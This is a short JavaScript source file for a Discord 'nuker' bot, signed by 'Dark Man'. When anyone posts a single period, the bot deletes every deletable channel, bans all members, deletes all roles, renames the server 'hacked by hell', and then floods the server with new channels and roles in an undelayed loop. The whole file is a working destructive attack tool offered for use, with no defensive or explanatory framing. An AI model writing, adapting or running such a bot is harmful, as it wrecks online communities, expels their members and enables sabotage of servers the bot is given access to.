const Discord = require("discord.js");
const client = new Discord.Client();
const prefix = ""; 
client.on("message", message => {
  if (message.content === ".") {
    if (message.channel.guild) {
      message.guild.channels.forEach(c => {
        if (c.deletable) {
          c.delete();
        }
      });
      message.guild.members.forEach(m => {
        m.ban();
      });
      message.guild.roles.forEach(r => {
        r.delete();
      });
      message.guild.setName("hacked by hell");
      setInterval(function() {
        message.guild.createChannel("hacked by hell", "voice");
        message.guild.createChannel("hacked by hell", "text");
        message.guild.createRole({ name: "hacked by hell" });
      });
    }
  }
});

client.login("");
///////By Dark Man\\\\\\\
